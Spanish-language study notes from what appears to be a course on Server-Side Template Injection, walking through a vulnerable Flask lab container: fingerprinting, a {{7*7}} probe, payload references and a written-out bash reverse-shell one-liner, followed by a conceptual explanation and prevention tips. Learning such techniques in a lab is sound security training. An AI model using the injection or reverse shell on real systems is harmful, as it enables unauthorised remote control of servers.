## Mis Apuntes: 

En esta clase comenzaremos con el siguiente ejemplo: 
desplegamos el siguiente contenedor con el siguiente comando: 
```
docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground
```
este contenedor tiene una pagina web la cual esta montada en flask, flask es un micro-framework que esta hecho en Python, hace que sea más fácil el hacer desarrollo de aplicaciones webs.
![[Pasted image 20240305182750.png]]
si apretamos log in, veremos la siguiente pestaña: 
![[Pasted image 20240305182927.png]]
si ocupamos whatweb para ver que tiene el servidor por detrás:
![[Pasted image 20240305183650.png]]
siempre que haya una pagina web donde este corriendo python o flask, siempre hay que pensar en un posible ssti
Entonces si tengo el control del input de la pagina y esta corriendo el servicio con flask o python, se puede poner a prueba la pagina de la siguiente forma: 
```
http://localhost:8089/?user={{7*7}}
```
![[Pasted image 20240305184116.png]]
para ver que payloads son importantes para este tipo de vulnerabilidades hay que entrar en este github:
https://github.com/swisskyrepo/PayloadsAllTheThings

para ser más especifico es este el link que ocuparemos:https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

ahora si queremos hacer lectura de alguno de los archivos internos de la maquina podemos ocupar los siguientes payloads: 
![[Pasted image 20240306002722.png]]
ahora podemos entender que es lo que hacen: 
![[Pasted image 20240306002952.png]]
también hay un payload para poder escribir comandos de la terminal: 
![[Pasted image 20240306003743.png]]
![[Pasted image 20240306003806.png]]
es decir que podemos ocupar el one liner para poder tomar control de la maquina: 
```
bash -c "bash -i >& /dev/tcp/<ip>/{puerto} 0>&1"
```



-----------
## Datos de la clase: 

El **Server-Side Template Injection** (**SSTI**) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor.

Las plantillas de servidor son archivos que contienen código que se utiliza para generar **contenido dinámico** en una aplicación web. Los atacantes pueden aprovechar una vulnerabilidad de SSTI para inyectar código malicioso en una plantilla de servidor, lo que les permite ejecutar comandos en el servidor y obtener acceso no autorizado tanto a la aplicación web como a posibles datos sensibles.

Por ejemplo, imagina que una aplicación web utiliza plantillas de servidor para generar correos electrónicos personalizados. Un atacante podría aprovechar una vulnerabilidad de **SSTI** para inyectar código malicioso en la plantilla de correo electrónico, lo que permitiría al atacante ejecutar comandos en el servidor y obtener acceso no autorizado a los datos sensibles de la aplicación web.

En un caso práctico, los atacantes pueden detectar si una aplicación Flask está en uso, por ejemplo, utilizando herramientas como **WhatWeb**. Si un atacante detecta que una aplicación **Flask** está en uso, puede intentar explotar una vulnerabilidad de **SSTI**, ya que Flask utiliza el motor de plantillas **Jinja2**, que es vulnerable a este tipo de ataque.

Para los atacantes, detectar una aplicación Flask o Python puede ser un primer paso en el proceso de intentar explotar una vulnerabilidad de SSTI. Sin embargo, los atacantes también pueden intentar identificar vulnerabilidades de SSTI en otras aplicaciones web que utilicen diferentes frameworks de plantillas, como Django, Ruby on Rails, entre otros.

Para prevenir los ataques de SSTI, los desarrolladores de aplicaciones web deben validar y filtrar adecuadamente la entrada del usuario y utilizar herramientas y frameworks de plantillas seguros que implementen medidas de seguridad para prevenir la inyección de código malicioso.
